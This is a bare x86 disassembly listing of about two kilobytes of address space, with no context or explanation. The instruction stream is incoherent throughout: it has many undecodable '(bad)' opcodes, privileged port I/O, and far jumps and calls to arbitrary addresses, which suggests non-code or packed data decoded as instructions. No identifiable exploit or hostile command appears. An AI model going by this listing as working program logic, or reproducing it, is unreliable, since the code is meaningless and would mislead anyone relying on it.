  4177c7:	mov    al,ds:0x488a47f4
  4177cc:	daa    
  4177cd:	fmul   QWORD PTR [ebx+0x431e9ba7]
  4177d3:	dec    esp
  4177d4:	out    0xb0,eax
  4177d6:	xor    esi,DWORD PTR [ecx]
  4177d8:	outs   dx,BYTE PTR ds:[esi]
  4177d9:	dec    ecx
  4177da:	enter  0x6311,0x3b
  4177de:	rol    DWORD PTR [ecx],0x1d
  4177e1:	cmp    edx,DWORD PTR [edx]
  4177e3:	jecxz  0x417777
  4177e5:	xlat   BYTE PTR ds:[ebx]
  4177e6:	jnp    0x417778
  4177e8:	push   ecx
  4177e9:	ins    DWORD PTR es:[edi],dx
  4177ea:	mov    ebx,0x9cb4a162
  4177ef:	or     DWORD PTR [esi],esp
  4177f1:	jmp    0x7b186110
  4177f6:	or     BYTE PTR [edx],dl
  4177f8:	cmc    
  4177f9:	and    bh,0x48
  4177fc:	popa   
  4177fd:	in     eax,0xfb
  4177ff:	js     0x4177c1
  417801:	mov    ?,WORD PTR [eax-0x1eb285ee]
  417807:	cdq    
  417808:	pop    ss
  417809:	cmp    ch,al
  41780b:	repz scas al,BYTE PTR es:[edi]
  41780d:	popa   
  41780e:	mov    DWORD PTR [ecx-0x50c89d68],eax
  417814:	lock jl 0x4177f0
  417817:	pop    edx
  417818:	xor    DWORD PTR [edi-0x2],eax
  41781b:	repnz sbb eax,0x507c730c
  417821:	lahf   
  417822:	push   ss
  417823:	mov    ebp,0xe1f4ddc4
  417828:	fs xchg ebx,eax
  41782a:	es jl  0x417816
  41782d:	adc    esp,DWORD PTR [ebx+0x111dbcc6]
  417833:	lock (bad) 
  417836:	out    0x8b,eax
  417838:	mov    bh,0x76
  41783a:	sub    DWORD PTR [edi],0xcc48b11c
  417840:	xor    eax,0xe3619aad
  417845:	dec    ebx
  417846:	pusha  
  417847:	sbb    esp,DWORD PTR [ecx+0x71]
  41784a:	xlat   BYTE PTR ds:[ebx]
  41784b:	push   esi
  41784c:	ret    0xa61f
  41784f:	xchg   BYTE PTR [ebp+0x265e4a0b],ch
  417855:	mov    ebp,0x436fa366
  41785a:	(bad)  
  41785b:	in     eax,0xa9
  41785d:	inc    eax
  41785e:	in     eax,dx
  41785f:	aas    
  417860:	ds jecxz 0x4178d2
  417863:	in     eax,dx
  417864:	dec    ebp
  417865:	popa   
  417866:	adc    BYTE PTR [esi],al
  417868:	adc    al,0x9c
  41786a:	adc    eax,0xf02e318a
  41786f:	jne    0x4178d1
  417871:	shr    DWORD PTR [ebx+0x5c],1
  417874:	mov    esi,0xef9f4379
  417879:	mov    al,0x95
  41787b:	out    dx,eax
  41787c:	cmp    dl,BYTE PTR [edi+0x118c1c7a]
  417882:	mov    bl,BYTE PTR [ecx+edi*2]
  417885:	cmp    eax,0xb8b89b3b
  41788a:	(bad)  
  41788b:	fwait
  41788c:	sbb    cl,ah
  41788e:	ins    BYTE PTR es:[edi],dx
  41788f:	ins    DWORD PTR es:[edi],dx
  417890:	and    eax,0xaad0d820
  417895:	xchg   ebx,eax
  417896:	cld    
  417897:	stc    
  417898:	bound  esp,QWORD PTR [ebx]
  41789a:	in     al,0xa1
  41789c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41789d:	and    BYTE PTR [ebp+0x5f],cl
  4178a0:	adc    ebp,DWORD PTR [ebp-0x26]
  4178a3:	mov    dl,0x2
  4178a5:	jecxz  0x417872
  4178a7:	lods   eax,DWORD PTR ds:[esi]
  4178a8:	push   es
  4178a9:	sub    eax,0x673c636a
  4178ae:	in     eax,dx
  4178af:	cmp    DWORD PTR [edx-0x36],edx
  4178b2:	ins    DWORD PTR es:[edi],dx
  4178b3:	jle    0x417860
	...
  417915:	add    BYTE PTR [eax+0x41],bl
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0x1e60e3bb
  417923:	inc    edx
  417924:	jg     0x4178f9
  417926:	(bad)  
  417927:	test   BYTE PTR [eax],0x0
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    BYTE PTR [ebx],bh
  41792f:	cmp    BYTE PTR [edx],ch
  417931:	mov    DWORD PTR [edi-0x7b062955],edi
  417937:	js     0x4178bc
  417939:	fcom   st(7)
  41793b:	out    dx,al
  41793c:	ins    BYTE PTR es:[edi],dx
  41793d:	push   esi
  41793e:	retf   
  41793f:	pop    ss
  417940:	ins    DWORD PTR es:[edi],dx
  417941:	jo     0x417978
  417943:	icebp  
  417944:	out    dx,eax
  417945:	jge    0x417958
  417947:	push   esp
  417948:	outs   dx,BYTE PTR ds:[esi]
  417949:	gs push ebp
  41794b:	mov    ah,0xd0
  41794d:	pushf  
  41794e:	(bad)  
  41794f:	mov    ds:0x8ecd4ab0,al
  417954:	or     bh,cl
  417956:	pop    ss
  417957:	call   0x3f17:0xce862240
  41795e:	sbb    esp,esp
  417960:	pop    edx
  417961:	mov    al,0xe6
  417963:	jmp    0x41796d
  417965:	fcomi  st,st(2)
  417967:	in     eax,dx
  417968:	daa    
  417969:	adc    bl,BYTE PTR [ebx-0x3dcfa92a]
  41796f:	sub    cl,BYTE PTR [ecx-0xaaf8a5f]
  417975:	vcmpss xmm2,xmm4,DWORD PTR [ebp+ebx*4+0x28f2d59],0xe2
  41797f:	mov    eax,ds:0xb5073f9b
  417984:	retf   0xef12
  417987:	(bad)  
  417988:	shl    BYTE PTR [ebx-0x46],cl
  41798b:	xchg   edi,edx
  41798d:	push   eax
  41798e:	mov    al,ch
  417990:	js     0x417a06
  417992:	add    BYTE PTR [edx+0x3c884f2b],0x7d
  417999:	xchg   ebp,eax
  41799a:	add    DWORD PTR [ebx],eax
  41799c:	scas   al,BYTE PTR es:[edi]
  41799d:	out    dx,al
  41799e:	das    
  41799f:	loop   0x417a1e
  4179a1:	push   ss
  4179a2:	mov    WORD PTR [edi-0x80],es
  4179a5:	pushf  
  4179a6:	loopne 0x417a08
  4179a8:	push   ebp
  4179a9:	fnsave [edi]
  4179ab:	xor    DWORD PTR [esi-0x1e],0x1c588285
  4179b2:	stos   DWORD PTR es:[edi],eax
  4179b3:	inc    esp
  4179b4:	mov    eax,ds:0x4601bcbe
  4179b9:	das    
  4179ba:	inc    eax
  4179bb:	mov    esp,0xa297c20d
  4179c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179c1:	dec    ecx
  4179c2:	sti    
  4179c3:	shl    DWORD PTR [ecx-0x50],1
  4179c6:	jae    0x4179f6
  4179c8:	mov    ebx,0x1bfff299
  4179cd:	adc    ecx,eax
  4179cf:	repnz mov al,ds:0x3a5af48a
  4179d5:	and    dl,BYTE PTR ds:0xfb627888
  4179db:	jge    0x4179e8
  4179dd:	jmp    0xca1eacc4
  4179e2:	and    eax,0x3dc7b15
  4179e7:	push   ecx
  4179e8:	and    BYTE PTR [edx-0x3a0d5da5],al
  4179ee:	mov    cl,0x79
  4179f0:	shr    DWORD PTR [ebx+0x3bf4019c],1
  4179f6:	or     eax,0xd0fe872d
  4179fb:	shl    DWORD PTR ds:0x2fd88f2c,0xcf
  417a02:	sub    al,0xb3
  417a04:	xor    al,0x4a
  417a06:	enter  0x2359,0xd3
  417a0a:	retf   
  417a0b:	fld    DWORD PTR [ebx+eax*8]
  417a0e:	pop    eax
  417a0f:	sub    bh,BYTE PTR [edi+edi*1]
  417a12:	(bad)  
  417a13:	cmc    
  417a14:	push   esi
  417a15:	aas    
  417a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a17:	dec    eax
  417a18:	inc    esi
  417a19:	mov    cl,0xc2
  417a1b:	fcmovbe st,st(7)
  417a1d:	(bad)  
  417a1f:	mov    ch,0xeb
  417a21:	call   0x4264:0x476fa
  417a28:	je     0x4179cc
  417a2a:	in     al,dx
  417a2b:	cmp    bl,BYTE PTR [ebx+0x713fee22]
  417a31:	push   ss
  417a32:	sub    eax,0x9e50
	...
  417a93:	add    BYTE PTR [eax],al
  417a95:	add    BYTE PTR [edi],ch
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx-0x4e]
  417aa3:	xlat   BYTE PTR ds:[ebx]
  417aa4:	loopne 0x417afe
  417aa6:	add    eax,0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    dl,ch
  417aaf:	and    DWORD PTR [ecx-0x4a],0xffffffca
  417ab3:	inc    ebp
  417ab4:	xchg   ebx,eax
  417ab5:	pop    ebx
  417ab6:	ds test edi,0xf2720608
  417abd:	xchg   edi,eax
  417abe:	jecxz  0x417a54
  417ac0:	les    eax,FWORD PTR [ebx-0x2c]
  417ac3:	pop    es
  417ac4:	mov    eax,ds:0x196202fb
  417ac9:	sbb    al,0x23
  417acb:	test   al,0x44
  417acd:	push   es
  417ace:	cwde   
  417acf:	retf   0xd837
  417ad2:	adc    eax,0x79c79598
  417ad7:	mov    esi,0x4e4faf77
  417adc:	bound  edi,QWORD PTR [ecx-0x24]
  417adf:	xchg   ecx,eax
  417ae0:	and    DWORD PTR [esp+esi*1-0x1c],eax
  417ae4:	in     al,0x8c
  417ae6:	sbb    esp,DWORD PTR [edx-0x73e07f0d]
  417aec:	push   esp
  417aed:	adc    eax,0x115307d4
  417af2:	hlt    
  417af3:	add    al,0x7c
  417af5:	and    ebp,DWORD PTR [edi]
  417af7:	(bad)  
  417af8:	fld    QWORD PTR [edx]
  417afa:	hlt    
  417afb:	shr    DWORD PTR [ebx],cl
  417afd:	rol    DWORD PTR [edx+0x5c],1
  417b00:	sub    ah,bh
  417b02:	mov    WORD PTR [edx+ebx*2-0x36086021],?
  417b09:	scas   al,BYTE PTR es:[edi]
  417b0a:	movsx  esi,WORD PTR [eax-0x7b]
  417b0e:	xchg   ebx,eax
  417b0f:	sub    eax,0xe8856380
  417b14:	bnd jmp 0x873c471f
  417b1a:	cmp    al,0x90
  417b1c:	mov    al,0xbe
  417b1e:	pop    ds
  417b1f:	sub    edi,eax
  417b21:	pop    ecx
  417b22:	adc    al,BYTE PTR [edx]
  417b24:	and    DWORD PTR [eax-0x5d],edi
  417b27:	mov    ecx,0x5bffcec5
  417b2c:	sbb    ebp,DWORD PTR [ecx-0x69d5a218]
  417b32:	add    BYTE PTR ds:0x9da251f2,0x77
  417b39:	xor    bl,bl
  417b3b:	and    DWORD PTR [edi+0x2e],0xee5068cb
  417b42:	hlt    
  417b43:	std    
  417b44:	xchg   BYTE PTR [ecx-0x53],ch
  417b47:	mov    WORD PTR [edx],?
  417b49:	test   eax,edi
  417b4b:	cli    
  417b4c:	pop    eax
  417b4d:	pop    ebx
  417b4e:	idiv   DWORD PTR [esi]
  417b50:	inc    ebp
  417b51:	ret    0x4b51
  417b54:	cmp    ebp,DWORD PTR [eax]
  417b56:	jmp    0x2782c922
  417b5b:	maxps  xmm1,XMMWORD PTR [ebp+0x4b605045]
  417b62:	xor    bl,BYTE PTR ds:0x580d74f8
  417b68:	pop    ecx
  417b69:	pop    edi
  417b6a:	(bad)  
  417b6b:	in     al,0xae
  417b6d:	add    DWORD PTR [edx],esp
  417b6f:	xlat   BYTE PTR ds:[ebx]
  417b70:	arpl   WORD PTR [esi-0x1265e6da],bx
  417b76:	push   edx
  417b77:	or     al,0xd8
  417b79:	(bad)  
  417b7a:	cmp    al,0x20
  417b7c:	mov    al,0x53
  417b7e:	xor    eax,0xa5e9e435
  417b83:	(bad)  
  417b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b86:	jmp    0x417b9e
  417b88:	cld    
  417b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b8a:	mov    cl,0x86
  417b8c:	xchg   ebx,eax
  417b8d:	adc    DWORD PTR [edi],ebp
  417b8f:	jbe    0x417bd3
  417b91:	xor    al,BYTE PTR [edx]
  417b93:	loop   0x417bf5
  417b95:	mov    esp,0x296c2d7f
  417b9a:	inc    ebx
  417b9b:	cli    
  417b9c:	cdq    
  417b9d:	sbb    BYTE PTR [ebx+0xa],ch
  417ba0:	push   eax
  417ba1:	nop
  417ba2:	hlt    
  417ba3:	jmp    0x5d57:0x936f82db
  417baa:	into   
  417bab:	inc    esp
  417bac:	inc    ecx
  417bad:	mov    cs,WORD PTR gs:[esp+ebp*8+0x57]
  417bb2:	lahf   
  417bb3:	ds add BYTE PTR cs:[eax],al
	...
  417c13:	add    BYTE PTR [eax],al
  417c15:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0xef
  417c23:	push   eax
  417c24:	jbe    0x417bda
  417c26:	or     al,0xf9
  417c28:	add    BYTE PTR [eax],al
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [esi+0x4],ch
  417c30:	in     eax,0x65
  417c32:	push   ds
  417c33:	test   DWORD PTR [edx+0xb9703ee],eax
  417c39:	fsubr  QWORD PTR [edi+0x58a76368]
  417c3f:	or     eax,0x701423d1
  417c44:	retf   0x6c00
  417c47:	imul   esi,DWORD PTR [eax+0x1256d6ad],0xc3149db2
  417c51:	mov    ebp,0x56d70211
  417c56:	sahf   
  417c57:	dec    BYTE PTR [edx+ecx*8]
  417c5a:	cmp    esi,edi
  417c5c:	or     ebx,edi
  417c5e:	ins    DWORD PTR es:[edi],dx
  417c5f:	aam    0x59
  417c61:	mov    ds:0x42bc0329,eax
  417c66:	jbe    0x417c51
  417c68:	xchg   DWORD PTR [ecx+esi*2+0x56256fc7],ebp
  417c6f:	inc    ebx
  417c70:	aas    
  417c71:	sub    BYTE PTR ss:[eax-0x5a],0xbd
  417c76:	call   0x8d54ecc8
  417c7b:	push   ecx
  417c7c:	inc    edi
  417c7d:	loopne 0x417c13
  417c7f:	sub    al,0x21
  417c81:	dec    ebx
  417c82:	hlt    
  417c83:	imul   eax,ecx,0x7d
  417c86:	inc    ebx
  417c87:	retf   0x8fac
  417c8a:	mov    ds:0x42505faf,eax
  417c8f:	ins    DWORD PTR es:[edi],dx
  417c90:	lods   al,BYTE PTR ds:[esi]
  417c91:	in     al,dx
  417c92:	aaa    
  417c93:	xor    BYTE PTR [edx],bl
  417c95:	out    0x89,al
  417c97:	loopne 0x417c4b
  417c99:	or     cl,BYTE PTR [ebp-0x576107ed]
  417c9f:	xchg   esp,eax
  417ca0:	xor    ebp,edx
  417ca2:	aaa    
  417ca3:	scas   al,BYTE PTR es:[edi]
  417ca4:	pushf  
  417ca5:	leave  
  417ca6:	and    DWORD PTR [esi+edx*1+0x5],esi
  417caa:	ss retf 0xa43c
  417cae:	adc    eax,0x2089e697
  417cb3:	leave  
  417cb4:	(bad)  
  417cb5:	rcl    BYTE PTR [ebx],cl
  417cb7:	mov    DWORD PTR [ebx-0x3e445b8c],eax
  417cbd:	jecxz  0x417c94
  417cbf:	push   0x49
  417cc1:	or     al,0x80
  417cc3:	sbb    edi,edi
  417cc5:	push   esp
  417cc6:	out    0x40,eax
  417cc8:	sbb    ebp,ebx
  417cca:	das    
  417ccb:	(bad)  
  417ccc:	leave  
  417ccd:	inc    esi
  417cce:	mov    cl,0x4b
  417cd0:	xlat   BYTE PTR ds:[ebx]
  417cd1:	test   ebx,esp
  417cd3:	xchg   ebx,eax
  417cd4:	cmc    
  417cd5:	mov    eax,ds:0x3ed23210
  417cda:	jge    0x417ce7
  417cdc:	ds pop esi
  417cde:	aas    
  417cdf:	and    eax,0xeb70d4d7
  417ce4:	fist   DWORD PTR [ebx+0x2f]
  417ce7:	(bad)  
  417ce8:	in     eax,0x28
  417cea:	gs inc ebx
  417cec:	or     eax,0xcfa9a812
  417cf1:	xor    BYTE PTR [edx],bh
  417cf3:	cmp    edi,ebx
  417cf5:	push   ecx
  417cf6:	in     eax,dx
  417cf7:	xor    DWORD PTR [ecx+0x6a7f4d15],ebp
  417cfd:	dec    ecx
  417cfe:	test   BYTE PTR [eax],dh
  417d00:	into   
  417d01:	xor    al,0x2
  417d03:	jne    0x417d1f
  417d05:	(bad)  
  417d06:	rol    BYTE PTR [edi+0x63a6c4fc],cl
  417d0c:	and    esp,DWORD PTR [esi-0x2965e8b]
  417d12:	mov    ch,0xd2
  417d14:	outs   dx,DWORD PTR ds:[esi]
  417d15:	fs (bad) 
  417d17:	pop    esi
  417d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d19:	mov    ebx,0x49b2f955
  417d1e:	dec    esp
  417d1f:	repz mov al,ds:0x5f038390
  417d25:	sahf   
  417d26:	xor    al,0xac
  417d28:	je     0x417d25
  417d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2b:	ins    DWORD PTR es:[edi],dx
  417d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2d:	loope  0x417d3f
  417d2f:	test   BYTE PTR [edx],bl
  417d31:	xor    cl,BYTE PTR [ebp-0x8]
  417d34:	stos   DWORD PTR es:[edi],eax
	...
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0x53
  417da3:	fild   WORD PTR [ebp+0x3d]
  417da6:	adc    edi,edx
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    BYTE PTR [esi],bh
  417daf:	out    0xaf,al
  417db1:	mov    al,ds:0xf40cb42f
  417db6:	mov    ch,BYTE PTR [ebp-0x1b]
  417db9:	push   0xbb4694c6
  417dbe:	xor    al,0xe6
  417dc0:	push   ss
  417dc1:	pusha  
  417dc2:	stc    
  417dc3:	test   dh,bl
  417dc5:	das    
  417dc6:	xor    BYTE PTR [ecx],al
  417dc8:	ficom  DWORD PTR [esi+0x1a]
  417dcb:	loop   0x417ded
  417dcd:	cmp    edi,DWORD PTR [edx-0x424b093b]
  417dd3:	sahf   
  417dd4:	sar    DWORD PTR [edi+0x4d9200f5],0xe2
  417ddb:	jbe    0x417d69
  417ddd:	enter  0x883a,0xa8
  417de1:	repnz aad 0xdc
  417de4:	or     eax,0x323e178a
  417de9:	out    0x20,al
  417deb:	scas   eax,DWORD PTR es:[edi]
  417dec:	(bad)  
  417dee:	test   eax,0xf301e66e
  417df3:	pop    DWORD PTR [edx-0x1299da57]
  417df9:	les    eax,FWORD PTR ds:0xe099e9e4
  417dff:	popa   
  417e00:	pop    ss
  417e01:	and    BYTE PTR [edx],0x7
  417e04:	push   cs
  417e05:	mov    ecx,DWORD PTR [ecx-0x1]
  417e08:	mov    bh,ch
  417e0a:	push   0x1c
  417e0c:	es retf 
  417e0e:	pop    ds
  417e0f:	sahf   
  417e10:	idiv   ebp
  417e12:	cmp    ebp,DWORD PTR [ebx-0x2cdc5f87]
  417e18:	sbb    BYTE PTR [ebx+0x57],ch
  417e1b:	enter  0xf615,0x79
  417e1f:	inc    edx
  417e20:	cmp    DWORD PTR [edx],0x359fe7f3
  417e26:	leave  
  417e27:	pop    ecx
  417e28:	test   eax,0x64512990
  417e2d:	add    al,0xa5
  417e2f:	fs and eax,0x113ca6ec
  417e35:	sub    DWORD PTR [ebx-0xa],edi
  417e38:	mov    cl,0xf2
  417e3a:	or     DWORD PTR [edx+eiz*4+0x78],0xffffffc5
  417e3f:	imul   ebp,DWORD PTR [edx],0x21ebd40f
  417e45:	sbb    eax,0x1cca8cbe
  417e4a:	dec    edx
  417e4b:	jmp    0xe24a:0xda81dae9
  417e52:	popf   
  417e53:	rol    BYTE PTR [edx],0x9
  417e56:	scas   eax,DWORD PTR es:[edi]
  417e57:	push   edi
  417e58:	mov    edi,?
  417e5a:	or     al,0xcb
  417e5c:	jecxz  0x417e8a
  417e5e:	(bad)
  417e61:	mov    eax,ds:0x51f535ee
  417e66:	lods   al,BYTE PTR ds:[esi]
  417e67:	push   0xffffffde
  417e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e6a:	subps  xmm0,xmm2
  417e6d:	and    bl,bl
  417e6f:	shl    DWORD PTR [ecx+0x76],0xa9
  417e73:	ror    DWORD PTR [ebp-0x35],1
  417e76:	js     0x417e53
  417e78:	pop    ecx
  417e79:	arpl   WORD PTR [ebx-0x4b],ax
  417e7c:	mov    ds:0xc65b1ce6,eax
  417e81:	and    DWORD PTR [edx-0x2c28e86b],esi
  417e87:	pop    edx
  417e88:	shr    dl,0x63
  417e8b:	mov    al,0x61
  417e8d:	jle    0x417e7d
  417e8f:	sub    eax,0xaa9ece70
  417e94:	mov    ss,WORD PTR [eax]
  417e96:	pop    ecx
  417e97:	push   ds
  417e98:	push   es
  417e99:	mov    bl,0x61
  417e9b:	and    ebx,ecx
  417e9d:	loopne 0x417f0f
  417e9f:	cmp    BYTE PTR ds:0x4e179e6c,0x6a
  417ea6:	jmp    0x2744b1a5
  417eab:	fs scas al,BYTE PTR es:[edi]
  417ead:	shl    BYTE PTR [esp+ebx*4-0x2d993bfe],1
  417eb4:	ret    
	...
  417f15:	add    BYTE PTR [edx-0x1a],ah
  417f18:	out    0x3b,al
  417f1a:	out    0x3b,al
  417f1c:	(bad)  
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	jno    0x417f92
  417f24:	loope  0x417f2a
  417f26:	sbb    bh,bl
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    BYTE PTR [esi],cl
  417f2f:	retf   0x8e76
  417f32:	imul   esi,DWORD PTR [edi+edx*2-0x44],0xddd8ae84
  417f3a:	test   eax,0x5cc3cd0
  417f3f:	hlt    
  417f40:	push   eax
  417f41:	call   0x9b9f:0xbb311e6a
  417f48:	sub    ecx,0xffffff94
  417f4b:	dec    ecx
  417f4c:	or     DWORD PTR [ecx-0x1684beda],0x6aa4bec9
  417f56:	mov    ebp,0xb12306be
  417f5b:	jno    0x417f40
  417f5d:	(bad)  
  417f5e:	iret   
  417f5f:	mov    esi,0xe396a2ee
  417f64:	fnsave ds:0xba008666
  417f6a:	je     0x417fe1
  417f6c:	xor    DWORD PTR [edx+0x282308b9],edx
  417f72:	idiv   DWORD PTR [ebx-0x27]
  417f75:	out    0x6e,eax
  417f77:	adc    al,0x2e
  417f79:	jmp    FWORD PTR [ecx-0x3726941f]
  417f7f:	popa   
  417f80:	jbe    0x417fb4
  417f82:	inc    ebx
  417f83:	jae    0x417f85
  417f85:	fsubr  st,st(0)
  417f87:	dec    ebp
  417f88:	mov    bl,0x5b
  417f8a:	(bad)  
  417f8b:	pop    ebx
  417f8c:	scas   eax,DWORD PTR es:[edi]
  417f8d:	adc    dl,dh
  417f8f:	lods   eax,DWORD PTR ds:[esi]
  417f90:	and    bh,BYTE PTR [edx-0x61]
  417f93:	jnp    0x417fce
  417f95:	pop    ds
  417f96:	or     eax,0x75e77e3c
  417f9b:	inc    ecx
  417f9c:	rcr    DWORD PTR [eax+0x4d],0xd9
  417fa0:	test   BYTE PTR [ecx-0x77229af2],ch
  417fa6:	push   ds
  417fa7:	push   DWORD PTR [ecx+0x5f1476e7]
  417fad:	int3   
  417fae:	mov    dl,dh
  417fb0:	js     0x417f73
  417fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fb3:	and    al,0x24
  417fb5:	xor    eax,0x9bbfb690
  417fba:	fcmovnu st,st(5)
  417fbc:	jle    0x418002
  417fbe:	(bad)  
  417fbf:	push   esp
  417fc0:	iret   
  417fc1:	mov    esi,DWORD PTR [edx]
  417fc3:	gs jmp 0x418022
  417fc6:	mov    ecx,0xb750306f
  417fcb:	jb     0x417fc2
  417fcd:	dec    ebp
  417fce:	push   edx
  417fcf:	sub    ebp,DWORD PTR [eax+0x4a]
  417fd2:	outs   dx,DWORD PTR ds:[esi]
  417fd3:	push   esi
  417fd4:	retf   0x91e8
  417fd7:	loopne 0x417faa
  417fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fdb:	adc    esp,DWORD PTR gs:[edx]
  417fde:	nop
  417fdf:	sbb    BYTE PTR [ebx+0x6db783be],bl
  417fe5:	jns    0x418006
  417fe7:	add    al,BYTE PTR [ecx+0x2e]
  417fea:	add    al,0x69
  417fec:	and    BYTE PTR [ecx-0x4f],al
  417fef:	fisubr WORD PTR [eax+edi*8]
  417ff2:	pop    esi
  417ff3:	test   bh,cl
  417ff5:	imul   esp,DWORD PTR [ebp-0x5e],0xa74fe324
  417ffc:	in     eax,0x2c
  417ffe:	add    dl,bh
  418000:	cmp    BYTE PTR ds:0x2e3f6abe,dh
  418006:	xlat   BYTE PTR ds:[ebx]
  418007:	cs cwde 
  418009:	ds addr16 add al,0x41
  41800d:	cdq    
  41800e:	mov    dl,0x96
  418010:	fstp   QWORD PTR [eax+eiz*2]
  418013:	push   ecx
  418014:	dec    esp
  418015:	sbb    al,0x8f
  418017:	ins    BYTE PTR es:[edi],dx
  418018:	mov    dh,0xa0
  41801a:	cwde   
  41801b:	popf   
  41801c:	cs pop esp
  41801e:	sub    DWORD PTR [esi],ecx
  418020:	dec    BYTE PTR [esi+0x28150592]
  418026:	out    0x26,eax
  418028:	test   DWORD PTR [edi-0x68],0x904f953
  41802f:	add    eax,0x8e176079
  418034:	int3   
	...
  418095:	add    BYTE PTR [ecx-0xba9482],ch
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx+0x8bb98c4]
  4180a3:	mov    cl,0x50
  4180a5:	fldenv [ecx]
  4180a7:	cld    
  4180a8:	add    BYTE PTR [eax],al
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    bh,bh
  4180af:	and    cl,BYTE PTR [ebx-0xc]
  4180b2:	jne    0x4180e6
  4180b4:	pop    ss
  4180b5:	test   al,0x28
  4180b7:	test   eax,0xb82fd9d9
  4180bc:	and    DWORD PTR [ecx+ecx*4-0x4b],eax
  4180c0:	jnp    0x418077
  4180c2:	shl    BYTE PTR [ecx],0x18
  4180c5:	push   ebp
  4180c6:	dec    edi
  4180c7:	aam    0xac
  4180c9:	mov    cl,BYTE PTR [ebx]
  4180cb:	mov    ebx,0xe27fd2ed
  4180d0:	add    BYTE PTR [esi+0x21],ah
  4180d3:	sbb    BYTE PTR [ebx+0x35],0x10
  4180d7:	xchg   BYTE PTR [esp+eiz*8+0xfc0fcba],al
  4180de:	xor    al,0x20
  4180e0:	rcr    DWORD PTR [edx-0x17b10597],cl
  4180e6:	push   ss
  4180e7:	mov    bh,0xaf
  4180e9:	push   cs
  4180ea:	mov    edx,0xa704edff
  4180ef:	sbb    al,0xcf
  4180f1:	sbb    al,0xbc
  4180f3:	stc    
  4180f4:	pop    esp
  4180f5:	pop    esp
  4180f6:	das    
  4180f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180f8:	ss cmc 
  4180fa:	add    ch,BYTE PTR [edx+0x41]
  4180fd:	addr16 cdq 
  4180ff:	push   ss
  418100:	je     0x4180bd
  418102:	or     bl,BYTE PTR [ebx]
  418104:	cli    
  418105:	fdivr  QWORD PTR [edi+ebx*1-0x7c496edb]
  41810c:	clc    
  41810d:	(bad)  
  41810f:	jbe    0x41810f
  418111:	inc    ebx
  418112:	arpl   WORD PTR [eax-0x55],bp
  418115:	mov    bl,0xe4
  418117:	xor    DWORD PTR [eax+ebp*2],eax
  41811a:	jg     0x4180c2
  41811c:	ss mov ebx,0x29aa08b7
  418122:	int3   
  418123:	cdq    
  418124:	dec    eax
  418125:	leave  
  418126:	out    dx,eax
  418127:	xor    eax,0x66d9a263
  41812c:	in     al,dx
  41812d:	in     al,dx
  41812e:	adc    edi,DWORD PTR [esi-0x5950ca22]
  418134:	arpl   WORD PTR [eax-0x784bf75f],cx
  41813a:	neg    BYTE PTR [esp+eax*2]
  41813d:	retf   0x6ea6
  418140:	xchg   ebx,eax
  418141:	push   ss
  418142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418143:	jb     0x4180d7
  418145:	lahf   
  418146:	rcl    BYTE PTR [ebx],cl
  418148:	fsub   DWORD PTR [eax]
  41814a:	or     BYTE PTR [eax-0x5e248d17],dl
  418150:	shl    DWORD PTR [esi+0x52e0ac63],cl
  418156:	or     BYTE PTR [eax+ecx*1-0x1b],0x6a
  41815b:	js     0x418143
  41815d:	pop    esp
  41815e:	iret   
  41815f:	sub    eax,0xa48f384
  418164:	push   ebp
  418165:	or     ebp,ecx
  418167:	inc    ebx
  418168:	push   edi
  418169:	jge    0x418175
  41816b:	shl    DWORD PTR [ebx+0x54fa95f9],0x79
  418172:	xor    ah,BYTE PTR [eax+0x2bc700d3]
  418178:	mov    eax,0x7d98dd52
  41817d:	test   al,0xdb
  41817f:	mov    eax,0x5be07f32
  418184:	mov    ch,0x58
  418186:	sar    BYTE PTR [ebp+0x7f],1
  418189:	xchg   eax,edx
  41818b:	inc    ebp
  41818c:	pop    ebx
  41818d:	or     ebp,DWORD PTR [ebx]
  41818f:	(bad)  
  418190:	push   ds
  418191:	dec    esi
  418192:	inc    esp
  418193:	sub    esp,DWORD PTR [edi]
  418195:	fwait
  418196:	aam    0x7d
  418198:	out    0x25,eax
  41819a:	lock inc ebx
  41819c:	clc    
  41819d:	not    DWORD PTR [esi]
